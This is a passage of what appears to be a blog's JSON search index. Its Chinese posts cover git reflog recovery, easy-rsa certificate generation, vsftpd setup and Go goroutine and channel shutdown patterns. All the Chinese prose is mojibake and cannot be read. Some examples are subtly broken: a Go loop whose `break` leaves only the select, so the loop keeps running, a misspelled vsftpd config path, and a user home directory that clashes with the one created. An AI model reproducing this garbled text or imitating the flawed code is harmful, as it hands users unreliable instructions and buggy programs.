å¯»æ‰¾è¦å›å¤çš„HEAD ï¼Œä»¥ä¸‹å‡è®¾æ˜¯HEAD@{3}\n$ git reset --hard HEAD@{3} # å›å¤\n```","tags":["git"],"categories":["git"]},{"title":"esayrsaç”Ÿæˆsslè¯ä¹¦","url":"%2Fp%2Fdf25a0d8.html","content":"\n### ä¸‹è½½releaseç‰ˆæœ¬\n\nhttps://github.com/OpenVPN/easy-rsa/releases\n\n### é…ç½®å…¬é’¥åŸºç¡€è®¾æ–½å˜é‡\n\n```\ncp vars.example vars\nvim vars\n```\n\nä¿®æ”¹å†…å®¹ç¤ºä¾‹\n\n```\nset_var EASYRSA_REQ_COUNTRY \"CN\"\nset_var EASYRSA_REQ_PROVINCE \"BeiJing\"\nset_var EASYRSA_REQ_CITY \"BeiJing\"\nset_var EASYRSA_REQ_ORG \"Wise Innovation Inc.\"\nset_var EASYRSA_REQ_EMAIL \"user@mail.com\"\nset_var EASYRSA_REQ_OU \"Wise Innovation\"\n```\n\n<!-- more -->\n\n### åˆå§‹åŒ– easyrsa\n\n1. åˆå§‹åŒ–\n\n```\n./easyrsa init-pki      # pki/{reqs,private} dir\n```\n\n2.  ç”Ÿæˆ crt\n\n\n```\n./easyrsa build-ca      # pki/private/ca.key pki/ca.crt\n```\n\nè¾“å…¥å¯†ç \n\n\nEnter PEM pass phrase:\n\n\nç¡®è®¤å¯†ç \n\n\nVerifying - Enter PEM pass phrase:\n\n\nè¾“å…¥ CA çš„åç§°, å¦‚: Wise Innovation CA\n\n\nCommon Name (eg: your user, host, or server name)[Easy-RSA CA]:\n\n\n\n### ç”Ÿæˆserverè¯ä¹¦ (å› ä¸ºç”¨äº†é€šé…ç¬¦, åœ¨ zsh å¥½åƒæ— æ•ˆ, ç”¨ bash æ‰§è¡Œå‘½ä»¤)\n\n```\n./easyrsa build-server-full *.fhyx.online nopass  //ç”¨bash\n```\n\n\n\n   ### ç”Ÿæˆclientè¯ä¹¦\n\n```\n./easyrsa build-client-full kc-spring-001 nopass \n\n./easyrsa build-client-full kc-box-001 nopass\n```","tags":["https"],"categories":["https"]},{"title":"linuxå¼€å¯ftpæœåŠ¡å’Œgolangå®ç°ftp_server_client","url":"%2Fp%2Fd43abcbd.html","content":"\n\n\n### linux å®‰è£… ftp æœåŠ¡\n\n1 . å®‰è£…ftp\n\n```\nsudo apt-get install vsftpd\n```\n\n2. ä¿®æ”¹é…ç½®  sudo vi /etc/vsftpd.con\n\n```\nlocal_root=/home/ftpuser\nwrite_enable=YES\nanon_mkdir_write_enable=YES\n```\n\n\n3. æ·»åŠ ftpç”¨æˆ·\n\n```\nmkdir /home/ftpuser\nsudo useradd -d /root/workspace -M ftpuser\nsudo passwd ftpuser\n```\n\n4. è°ƒæ•´æ–‡ä»¶å¤¹æƒé™\n\n```\nchown ftpuser:ftpuser  /home/ftpuser/\nsudo chmod a-w  /home/ftpuser \n```\n\n5. ä¿®æ”¹pam.d/vsftpd\n\n```\nsudo vi /etc/pam.d/vsftpd\n#auth    required pam_shells.so //æ³¨é‡Šæ‰è¿™ä¸€è¡Œ\nsudo service vsftpd restart\n```\n\n6. è¿æ¥\n\n```\nftp://207.246.80.69  //é€šè¿‡æµè§ˆå™¨è®¿é—®\n\nmac å¯ä»¥ä¸‹è½½ filezilla å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥\n```\n\n<!-- more -->\n\n## golang å®ç° ftp-server ftp-client\n\n### server\n\nhttps://github.com/fclairamb/ftpserver \n\n### client\n\nhttps://github.com/secsy/goftp\n\nhttps://github.com/jlaffaye/ftp\n\n### io progress\n\nhttps://github.com/mitchellh/ioprogress\n\n#### æ³¨æ„äº‹é¡¹:\n\n+ æ˜¾ç¤ºè¿›åº¦çš„æ—¶å€™è¦ç¡®å®šæ€»çš„size\n\n+ åœ¨æ˜¾ç¤ºè¿›åº¦çš„æ—¶å€™è¦æ³¨æ„è®¾ç½®æ–­ç‚¹ç»­ä¼ çš„è¿›åº¦\n\n+ åˆ—å‡ºfileçš„åå­—\n\n","tags":["golang"],"categories":["golang"]},{"title":"golangä¼˜é›…çš„ç­‰å¾…æˆ–é€šçŸ¥goroutineé€€å‡º","url":"%2Fp%2Faca47db0.html","content":"\n\n\n### ä¼˜é›…çš„ç­‰å¾…goroutineé€€å‡º\n\n\n\n#### é€šè¿‡Channelä¼ é€’é€€å‡ºä¿¡å·\n\nGoçš„ä¸€å¤§è®¾è®¡å“²å­¦å°±æ˜¯ï¼šé€šè¿‡Channelå…±äº«æ•°æ®ï¼Œè€Œä¸æ˜¯é€šè¿‡å…±äº«å†…å­˜å…±äº«æ•°æ®ã€‚ä¸»æµç¨‹å¯ä»¥é€šè¿‡channelå‘ä»»ä½•goroutineå‘é€åœæ­¢ä¿¡å·ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š\n\n\n\nè¿™ç§æ–¹å¼å¯ä»¥å®ç°ä¼˜é›…åœ°åœæ­¢goroutineï¼Œä½†æ˜¯å½“goroutineç‰¹åˆ«å¤šçš„æ—¶å€™ï¼Œè¿™ç§æ–¹å¼ä¸ç®¡åœ¨ä»£ç ç¾è§‚ä¸Šè¿˜æ˜¯ç®¡ç†ä¸Šéƒ½æ˜¾å¾—ç¬¨æ‹™ä¸å ªã€‚\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"time\"\n)\n\nfunc run(done chan int) {\n   for {\n      select {\n      case <-done:\n         fmt.Println(\"exiting...\")\n         done <- 1\n         break\n      default:\n      }\n\n      time.Sleep(time.Second * 1)\n      fmt.Println(\"do something\")\n   }\n}\n\nfunc main() {\n   c := make(chan int)\n\n   go run(c)\n\n   fmt.Println(\"wait\")\n   time.Sleep(time.Second * 5)\n\n   c <- 1\n   <-c\n\n   fmt.Println(\"main exited\")\n}\n```\n\n<!-- more -->\n\n#### ä½¿ç”¨Waitgroup\n\né€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åƒä¸‹é¢è¿™æ ·ä½¿ç”¨waitgroup:\n\n1. åˆ›å»ºä¸€ä¸ªWaitgroupçš„å®ä¾‹ï¼Œå‡è®¾æ­¤å¤„æˆ‘ä»¬å«å®ƒwg\n2. åœ¨æ¯ä¸ªgoroutineå¯åŠ¨çš„æ—¶å€™ï¼Œè°ƒç”¨wg.Add(1)ï¼Œè¿™ä¸ªæ“ä½œå¯ä»¥åœ¨goroutineå¯åŠ¨ä¹‹å‰è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨goroutineé‡Œé¢è°ƒç”¨ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨åˆ›å»ºnä¸ªgoroutineå‰è°ƒç”¨wg.Add(n)\n3. å½“æ¯ä¸ªgoroutineå®Œæˆä»»åŠ¡åï¼Œè°ƒç”¨wg.Done()\n4. åœ¨ç­‰å¾…æ‰€æœ‰goroutineçš„åœ°æ–¹è°ƒç”¨wg.Wait()ï¼Œå®ƒåœ¨æ‰€æœ‰æ‰§è¡Œäº†wg.Add(1)çš„goroutineéƒ½è°ƒç”¨å®Œwg.Done()å‰é˜»å¡ï¼Œå½“æ‰€æœ‰goroutineéƒ½è°ƒç”¨å®Œwg.Done()ä¹‹åå®ƒä¼šè¿”å›ã€‚\n\né‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬çš„goroutineæ˜¯ä¸€åŒ¹ä¸çŸ¥ç–²å€¦çš„ç‰›ï¼Œä¸€ç›´å­œå­œä¸å€¦åœ°å·¥ä½œçš„è¯ï¼Œå¦‚ä½•åœ¨ä¸»æµç¨‹ä¸­å‘ŠçŸ¥å¹¶ç­‰å¾…å®ƒé€€å‡ºå‘¢ï¼Ÿåƒä¸‹é¢è¿™æ ·åšï¼š\n\n\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"os\"\n   \"os/signal\"\n   \"sync\"\n   \"syscall\"\n)\n\ntype Service struct {\n   // Other things\n\n   ch        chan bool\n   waitGroup *sync.WaitGroup\n}\n\nfunc NewService() *Service {\n   s := &Service{\n      // Init Other things\n      ch:        make(chan bool),\n      waitGroup: &sync.WaitGroup{},\n   }\n\n   return s\n}\n\nfunc (s *Service) Stop() {\n   close(s.ch)\n   s.waitGroup.Wait()\n}\n\nfunc (s *Service) Serve() {\n   s.waitGroup.Add(1)\n   defer s.waitGroup.Done()\n\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n      s.waitGroup.Add(1)\n      go s.anotherServer()\n   }\n}\nfunc (s *Service) anotherServer() {\n   defer s.waitGroup.Done()\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n\n      // Do something\n   }\n}\n\nfunc main() {\n\n   service := NewService()\n   go service.Serve()\n\n   // Handle SIGINT and SIGTERM.\n   ch := make(chan os.Signal)\n   signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)\n   fmt.Println(<-ch)\n\n   // Stop the service gracefully.\n   service.Stop()\n}\n```\n\n\n\n### ä¼˜é›…çš„é€šçŸ¥ goroutine é€€å‡º\n\n\n\næœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦é€šçŸ¥goroutineåœæ­¢å®ƒæ­£åœ¨å¹²çš„äº‹æƒ…ï¼Œæ¯”å¦‚ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œè®¡ç®—çš„webæœåŠ¡ï¼Œç„¶è€Œå®ƒçš„å®¢æˆ·ç«¯å·²ç»æ–­å¼€äº†å’ŒæœåŠ¡ç«¯çš„è¿æ¥ã€‚\n\nGoè¯­è¨€å¹¶æ²¡æœ‰æä¾›åœ¨ä¸€ä¸ªgoroutineä¸­ç»ˆæ­¢å¦ä¸€ä¸ªgoroutineçš„æ–¹æ³•ï¼Œç”±äºè¿™æ ·ä¼šå¯¼è‡´goroutineä¹‹é—´çš„å…±äº«å˜é‡è½åœ¨æœªå®šä¹‰çš„çŠ¶æ€ä¸Šã€‚\n\nåœ¨rocket launchç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¾€åå­—å«abortçš„channelé‡Œå‘é€äº†ä¸€ä¸ªç®€å•çš„å€¼ï¼Œåœ¨countdownçš„goroutineä¸­ä¼šæŠŠè¿™ä¸ªå€¼ç†è§£ä¸ºè‡ªå·±çš„é€€å‡ºä¿¡å·ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦é€€å‡ºä¸¤ä¸ªæˆ–è€…ä»»æ„å¤šä¸ªgoroutineæ€ä¹ˆåŠå‘¢ï¼Ÿ\n\n\n\nä¸€ç§å¯èƒ½çš„æ‰‹æ®µæ˜¯å‘abortçš„channelé‡Œå‘é€å’Œgoroutineæ•°ç›®ä¸€æ ·å¤šçš„äº‹ä»¶æ¥é€€å‡ºå®ƒä»¬ã€‚å¦‚æœè¿™äº›goroutineä¸­å·²ç»æœ‰ä¸€äº›è‡ªå·±é€€å‡ºäº†ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æˆ‘ä»¬çš„channelé‡Œçš„äº‹ä»¶æ•°æ¯”goroutineè¿˜å¤šï¼Œè¿™æ ·å¯¼è‡´æˆ‘ä»¬çš„å‘é€ç›´æ¥è¢«é˜»å¡ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœè¿™äº›goroutineåˆç”Ÿæˆäº†å…¶å®ƒçš„goroutineï¼Œæˆ‘ä»¬çš„channelé‡Œçš„æ•°ç›®åˆå¤ªå°‘äº†ï¼Œæ‰€ä»¥æœ‰äº›goroutineå¯èƒ½ä¼šæ— æ³•æ¥æ”¶åˆ°é€€å‡ºæ¶ˆæ¯ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯å¾ˆéš¾çŸ¥é“åœ¨æŸä¸€ä¸ªæ—¶åˆ»å…·ä½“æœ‰å¤šå°‘ä¸ªgoroutineåœ¨è¿è¡Œç€çš„ã€‚\n\n\n\nå¦å¤–ï¼Œå½“ä¸€ä¸ªgoroutineä»abort channelä¸­æ¥æ”¶åˆ°ä¸€ä¸ªå€¼çš„æ—¶å€™ï¼Œä»–ä¼šæ¶ˆè´¹æ‰è¿™ä¸ªå€¼ï¼Œè¿™æ ·å…¶å®ƒçš„goroutineå°±æ²¡æ³•çœ‹åˆ°è¿™æ¡ä¿¡æ¯ã€‚ä¸ºäº†èƒ½å¤Ÿè¾¾åˆ°æˆ‘ä»¬é€€å‡ºgoroutineçš„ç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ›´é è°±çš„ç­–ç•¥ï¼Œæ¥é€šè¿‡ä¸€ä¸ªchannelæŠŠæ¶ˆæ¯å¹¿æ’­å‡ºå»ï¼Œè¿™æ ·goroutineä»¬èƒ½å¤Ÿçœ‹åˆ°è¿™æ¡äº‹ä»¶æ¶ˆæ¯ï¼Œå¹¶ä¸”åœ¨äº‹ä»¶å®Œæˆä¹‹åï¼Œå¯ä»¥çŸ¥é“è¿™ä»¶äº‹å·²ç»å‘ç”Ÿè¿‡äº†ã€‚\n\n\n\nå›å¿†ä¸€ä¸‹æˆ‘ä»¬å…³é—­äº†ä¸€ä¸ªchannelå¹¶ä¸”è¢«æ¶ˆè´¹æ‰äº†æ‰€æœ‰å·²å‘é€çš„å€¼ï¼Œæ“ä½œchannelä¹‹åçš„ä»£ç å¯ä»¥ç«‹å³è¢«æ‰§è¡Œï¼Œå¹¶ä¸”ä¼šäº§ç”Ÿé›¶å€¼ã€‚æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæœºåˆ¶æ‰©å±•ä¸€ä¸‹ï¼Œæ¥ä½œä¸ºæˆ‘ä»¬çš„å¹¿æ’­æœºåˆ¶ï¼š***ä¸è¦å‘channelå‘é€å€¼ï¼Œè€Œæ˜¯ç”¨å…³é—­ä¸€ä¸ªchannelæ¥è¿›è¡Œå¹¿æ’­ã€‚***\n\n\n\n\n\n### ä¼˜é›…çš„æ§åˆ¶ goroutine é€€å‡º\n\né€šå¸¸`Goroutine`ä¼šå› ä¸ºä¸¤ç§æƒ…å†µé˜»å¡ï¼š\n\n1. IOæ“ä½œï¼Œæ¯”å¦‚å¯¹`Socket`çš„`Read`ã€‚\n2. `channel`æ“ä½œã€‚å¯¹ä¸€ä¸ªchançš„è¯»å†™éƒ½æœ‰å¯èƒ½é˜»å¡`Goroutine`ã€‚\n\n\n\nå¯¹äºæƒ…å†µ1ï¼Œåªéœ€è¦å…³é—­å¯¹åº”çš„æè¿°ç¬¦ï¼Œé˜»å¡çš„`Goroutine`è‡ªç„¶ä¼šè¢«å”¤é†’ã€‚\n\né‡ç‚¹è®¨è®ºæƒ…å†µ2ã€‚å¹¶å‘ç¼–ç¨‹ï¼Œ`Goroutine`æä¾›ä¸€ç§`channel`æœºåˆ¶ï¼Œ`channel`ç±»ä¼¼ç®¡é“ï¼Œå†™å…¥è€…å‘é‡Œé¢å†™å…¥æ•°æ®ï¼Œè¯»å–è€…ä»ä¸­è¯»å–æ•°æ®ã€‚å¦‚æœ`channel`é‡Œé¢æ²¡æœ‰æ•°æ®ï¼Œè¯»å–è€…å°†é˜»å¡ï¼Œç›´åˆ°æœ‰æ•°æ®ï¼›å¦‚æœ`channel`é‡Œé¢æ•°æ®æ»¡äº†ï¼Œå†™å…¥è€…å°†å› ä¸ºæ— æ³•ç»§ç»­å†™å…¥æ•°æ®è€Œé˜»å¡ã€‚\n\nå¦‚æœåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸé‡Œï¼Œwriterå’Œreaderéƒ½è¡¨ç°ä¸ºä¸€ä¸ª`Goroutine`ï¼Œå§‹ç»ˆéƒ½åœ¨å·¥ä½œï¼Œé‚£ä¹ˆå¦‚ä½•åœ¨åº”ç”¨ç¨‹åºç»“æŸå‰ï¼Œé€šçŸ¥å®ƒä»¬ç»ˆæ­¢å‘¢ï¼Ÿåœ¨Goä¸­ï¼Œå¹¶ä¸æ¨èåƒabortçº¿ç¨‹é‚£æ ·ï¼Œå¼ºè¡Œçš„ç»ˆæ­¢`Goroutine`ã€‚å› æ­¤ï¼ŒæŠ½è±¡çš„è¯´ï¼Œå¿…ç„¶éœ€è¦ä¿ç•™ä¸€ä¸ªå…¥å£ï¼Œèƒ½å¤Ÿè·Ÿwriteræˆ–readeré€šä¿¡ï¼Œä»¥å‘ŠçŸ¥å®ƒä»¬ç»ˆæ­¢ã€‚\n\n \n\n\n\næˆ‘ä»¬å…ˆçœ‹readerã€‚æˆ‘ä»¬é¦–å…ˆå¯ä»¥æƒ³åˆ°ï¼Œåˆ©ç”¨`close`å‡½æ•°å…³é—­æ­£åœ¨è¯»å–çš„`channel`ï¼Œä»è€Œå¯ä»¥å”¤é†’readerï¼Œå¹¶é€€å‡ºã€‚ä½†æ˜¯è€ƒè™‘åˆ°`close`å¹¶ä¸èƒ½å¾ˆå¥½çš„å¤„ç†writerï¼ˆå› ä¸ºwriterè¯•å›¾å†™å…¥ä¸€ä¸ªå·²ç»closeçš„channelï¼Œå°†å¼•å‘å¼‚å¸¸ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¾è®¡ä¸€ä¸ªé¢å¤–çš„åªè¯»`channel`ç”¨äºé€šçŸ¥ï¼š\n\n```\ntype routineSignal struct {\n    done <-chan struct{}\n}\n```\n\n `routineSignal`çš„å®ä¾‹ï¼Œåº”å½“é€šè¿‡å¤–éƒ¨ç”Ÿæˆå¹¶ä¼ é€’ç»™readerï¼Œä¾‹å¦‚ï¼š\n\n```\nfunc (r *reader)init(s *routineSignal) {\n    r.signal = s\n}\n```\n\n åœ¨readerçš„å¾ªç¯ä¸­ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š\n\n```\nfunc (r *reader)loop() {\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\nå½“éœ€è¦ç»ˆæ­¢`Goroutine`çš„æ—¶å€™åªéœ€è¦å…³é—­è¿™ä¸ªé¢å¤–çš„`channel`ï¼š\n\n```\nclose(signal.done)\n```\n\n \n\n\n\nçœ‹èµ·æ¥å¾ˆå®Œå¤‡äº†ï¼Œè¿™å¯ä»¥å¤„ç†å¤§éƒ¨åˆ†çš„æƒ…å†µäº†ã€‚è¿™æ ·åšæœ‰ä¸ªå¼Šç«¯ï¼Œå°½ç®¡ï¼Œæˆ‘ä»¬å¯ä»¥æœŸæœ›`close`å”¤é†’`Goroutine`è¿›è€Œé€€å‡ºï¼Œä½†æ˜¯å¹¶ä¸èƒ½çŸ¥é“`Goroutine`ä»€ä¹ˆæ—¶å€™å®Œæˆé€€å‡ºï¼Œå› ä¸º`Goroutine`å¯èƒ½åœ¨é€€å‡ºå‰è¿˜æœ‰ä¸€äº›å–„åå·¥ä½œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦`sync.WaitGroup`ã€‚æ”¹é€ ä¸€ä¸‹`routineSignal`ï¼š\n\n\n\n```\ntype routineSignal struct {\n    done chan struct{}\n    wg   sync.WaitGroup\n}\n```\n\n\n\nå¢åŠ ä¸€ä¸ªsync.WaitGroupçš„å®ä¾‹ï¼Œåœ¨`Goroutine`å¼€å§‹å·¥ä½œæ—¶ï¼Œå¯¹wgåŠ 1ï¼Œåœ¨`Goroutine`é€€å‡ºå‰ï¼Œå¯¹wgå‡1ï¼š\n\n```\nfunc (r *reader)loop() {\n    r.signal.wg.Add(1)\n    defer r.signal.wg.Done()\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n å¤–éƒ¨ï¼Œåªéœ€è¦ç­‰å¾…`WaitGroup`è¿”å›å³å¯ï¼š\n\n```\nclose(signal.done)\nsignal.wg.Wait()\n```\n\nåªè¦`Wait()`è¿”å›å°±èƒ½æ–­å®š`Goroutine`ç»“æŸäº†ã€‚\n\n\n\næ¨å¯¼ä¸€ä¸‹ï¼Œä¸éš¾å‘ç°ï¼Œå¯¹äºwriterä¹Ÿå¯ä»¥é‡‡ç”¨è¿™ç§æ–¹æ³•ã€‚äºæ˜¯ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå«`routineSignal`çš„ç»“æ„ï¼Œç»“æ„é‡Œé¢åŒ…å«ä¸€ä¸ª`chan`ç”¨æ¥é€šçŸ¥`Goroutine`ç»“æŸï¼ŒåŒ…å«ä¸€ä¸ª`WaitGroup`ç”¨äº`Goroutine`é€šçŸ¥å¤–éƒ¨å®Œæˆå–„åã€‚è¿™æ ·ï¼Œé€šè¿‡è¿™ä¸ªç»“æ„çš„å®ä¾‹ä¼˜é›…çš„ç»ˆæ­¢`Goroutine`ï¼Œè€Œä¸”è¿˜å¯ä»¥ç¡®ä¿`Goroutine`ç»ˆæ­¢æˆåŠŸã€‚ ","tags":["golang"],"categories":["golang"]},{"title":"golangä¼˜é›…çš„å…³é—­channel","url":"%2Fp%2F8b210700.html","content":"\n\n\n### Channelä½¿ç”¨è§„èŒƒ\n\nåœ¨ä¸èƒ½æ›´æ”¹channelçŠ¶æ€çš„æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ç®€å•æ™®éçš„æ–¹å¼æ¥æ£€æŸ¥channelæ˜¯å¦å·²ç»å…³é—­äº†\n\nå…³é—­å·²ç»å…³é—­çš„channelä¼šå¯¼è‡´panicï¼Œæ‰€ä»¥åœ¨closer(å…³é—­è€…)ä¸çŸ¥é“channelæ˜¯å¦å·²ç»å…³é—­çš„æƒ…å†µä¸‹å»å…³é—­channelæ˜¯å¾ˆå±é™©çš„\n\nå‘é€å€¼åˆ°å·²ç»å…³é—­çš„channelä¼šå¯¼è‡´panicï¼Œæ‰€ä»¥å¦‚æœsender(å‘é€è€…)åœ¨ä¸çŸ¥é“channelæ˜¯å¦å·²ç»å…³é—­çš„æƒ…å†µä¸‹å»å‘channelå‘é€å€¼æ˜¯å¾ˆå±é™©çš„\n\n \n\n### The Channel Closing Principle\n\nåœ¨ä½¿ç”¨Go channelçš„æ—¶å€™ï¼Œä¸€ä¸ªé€‚ç”¨çš„åŸåˆ™æ˜¯*ä¸è¦ä»æ¥æ”¶ç«¯å…³é—­channelï¼Œä¹Ÿä¸è¦å…³é—­æœ‰å¤šä¸ªå¹¶å‘å‘é€è€…çš„channel*ã€‚\n\næ¢å¥è¯è¯´ï¼Œå¦‚æœsender(å‘é€è€…)åªæ˜¯å”¯ä¸€çš„senderæˆ–è€…æ˜¯channelæœ€åä¸€ä¸ªæ´»è·ƒçš„senderï¼Œé‚£ä¹ˆä½ åº”è¯¥åœ¨senderçš„goroutineå…³é—­channelï¼Œä»è€Œé€šçŸ¥receiver(s)(æ¥æ”¶è€…ä»¬)å·²ç»æ²¡æœ‰å€¼å¯ä»¥è¯»äº†ã€‚ç»´æŒè¿™æ¡åŸåˆ™å°†ä¿è¯æ°¸è¿œä¸ä¼šå‘ç”Ÿå‘ä¸€ä¸ªå·²ç»å…³é—­çš„channelå‘é€å€¼æˆ–è€…å…³é—­ä¸€ä¸ªå·²ç»å…³é—­çš„channelã€‚\n\n<!-- more -->\n\n### æ‰“ç ´Channel Closing Principleçš„è§£å†³æ–¹æ¡ˆ \n\n \n\nå¦‚æœä½ å› ä¸ºæŸç§åŸå› ä»æ¥æ”¶ç«¯ï¼ˆreceiver sideï¼‰å…³é—­channelæˆ–è€…åœ¨å¤šä¸ªå‘é€è€…ä¸­çš„ä¸€ä¸ªå…³é—­channelï¼Œé‚£ä¹ˆä½ åº”è¯¥ä½¿ç”¨åˆ—åœ¨[Golang panic/recover Use Cases](https://link.jianshu.com/?t=http://www.tapirgames.com/blog/golang-panic-use-cases)çš„å‡½æ•°æ¥å®‰å…¨åœ°å‘é€å€¼åˆ°channelä¸­ï¼ˆå‡è®¾channelçš„å…ƒç´ ç±»å‹æ˜¯Tï¼‰\n\n \n\n```\nfunc SafeSend(ch chan T, value T) (closed bool) {\n    defer func() {\n        if recover() != nil {\n            // the return result can be altered \n            // in a defer function call\n            closed = true\n        }\n    }()\n    \n    ch <- value // panic if ch is closed\n    return false // <=> closed = false; return\n}\n```\n\n \n\nåŒæ ·çš„æƒ³æ³•ä¹Ÿå¯ä»¥ç”¨åœ¨ä»å¤šä¸ªgoroutineå…³é—­channelä¸­ï¼š\n\n\n\n```\nfunc SafeClose(ch chan T) (justClosed bool) {\n\tdefer func() {\n\t\tif recover() != nil {\n\t\t\tjustClosed = false\n\t\t}\n\t}()\n\t\n\t// assume ch != nil here.\n\tclose(ch) // panic if ch is closed\n\treturn true // <=> justClosed = true; return\n}\n```\n\n\n\nå¾ˆå¤šäººå–œæ¬¢ç”¨`sync.Once`æ¥å…³é—­channelï¼š\n\n```\n type MyChannel struct {\n\tC    chan T\n\tonce sync.Once\n}\n\nfunc NewMyChannel() *MyChannel {\n\treturn &MyChannel{C: make(chan T)}\n}\n\nfunc (mc *MyChannel) SafeClose() {\n\tmc.once.Do(func() {\n\t\tclose(mc.C)\n\t})\n}\n```\n\n\n\nè¦çŸ¥é“golangçš„è®¾è®¡è€…ä¸æä¾›SafeCloseæˆ–è€…SafeSendæ–¹æ³•æ˜¯æœ‰åŸå› çš„ï¼Œä»–ä»¬æœ¬æ¥å°±ä¸æ¨èåœ¨æ¶ˆè´¹ç«¯æˆ–è€…åœ¨å¹¶å‘çš„å¤šä¸ªç”Ÿäº§ç«¯å…³é—­channelï¼Œæ¯”å¦‚å…³é—­åªè¯»channelåœ¨è¯­æ³•ä¸Šå°±å½»åº•è¢«ç¦æ­¢ä½¿ç”¨äº†ã€‚\n\n \n\n### ä¼˜é›…çš„å…³é—­Channelçš„æ–¹æ³•\n\nä¸Šæ–‡çš„SafeSendæ–¹æ³•ä¸€ä¸ªå¾ˆå¤§çš„åŠ£åŠ¿åœ¨äºå®ƒä¸èƒ½ç”¨åœ¨selectå—çš„caseè¯­å¥ä¸­ã€‚è€Œå¦ä¸€ä¸ªå¾ˆé‡è¦çš„åŠ£åŠ¿åœ¨äºåƒæˆ‘è¿™æ ·å¯¹ä»£ç æœ‰æ´ç™–çš„äººæ¥è¯´ï¼Œä½¿ç”¨panic/recoverå’Œsync/mutexæ¥æå®šä¸æ˜¯é‚£ä¹ˆçš„ä¼˜é›…ã€‚ä¸‹é¢æˆ‘ä»¬å¼•å…¥åœ¨ä¸åŒçš„åœºæ™¯ä¸‹å¯ä»¥ä½¿ç”¨çš„çº¯ç²¹çš„ä¼˜é›…çš„è§£å†³æ–¹æ³•ã€‚\n\n \n\n#### å¤šä¸ªæ¶ˆè´¹è€…ï¼Œå•ä¸ªç”Ÿäº§è€…ã€‚\n\nè¿™ç§æƒ…å†µæœ€ç®€å•ï¼Œç›´æ¥è®©ç”Ÿäº§è€…å…³é—­channelå¥½äº†ã€‚ \n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 100\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\n\tdataCh := make(chan int, 100)\n\t\n\t// ä¸€ä¸ªç”Ÿäº§è€…\n\tgo func() {\n\t\tfor {\n\t\t\tif value := rand.Intn(MaxRandomNumber); value == 0 {\n\t\t\t\tclose(dataCh)\n\t\t\t\treturn\n\t\t\t} else {\t\t\t\n\t\t\t\tdataCh <- value\n\t\t\t}\n\t\t}\n\t}()\n\t\n\t// å¤šä¸ªæ¶ˆè´¹è€…\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func() {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor value := range dataCh {\n\t\t\t\tlog.Println(value)\n\t\t\t}\n\t\t}()\n\t}\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n#### å¤šä¸ªç”Ÿäº§è€…ï¼Œå•ä¸ªæ¶ˆè´¹è€…ã€‚\n\nè¿™ç§æƒ…å†µè¦æ¯”ä¸Šé¢çš„å¤æ‚ä¸€ç‚¹ã€‚æˆ‘ä»¬ä¸èƒ½åœ¨æ¶ˆè´¹ç«¯å…³é—­channelï¼Œå› ä¸ºè¿™è¿èƒŒäº†channelå…³é—­åŸåˆ™ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è®©æ¶ˆè´¹ç«¯å…³é—­ä¸€ä¸ªé™„åŠ çš„ä¿¡å·æ¥é€šçŸ¥å‘é€ç«¯åœæ­¢ç”Ÿäº§æ•°æ®ã€‚\n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(1)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{})\n\t\n\t\n\t// å¤šä¸ªç”Ÿäº§è€…\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func() {\n\t\t\tfor {\n\t\t\n\t\t\t\t// ç›®çš„æ˜¯å°è¯•é€€å‡º, å› ä¸ºè¶Šæ—©è¶Šå¥½, æ­¤å¤„å¯ä»¥çœç•¥, å› ä¸ºå°±ç®—å¤šå‘é€äº†å€¼, æ¶ˆè´¹è€…ä¹Ÿä¸ä¼šç†ä¼šäº†\n\t\t\t\tselect {\n\t\t\t\tcase <- 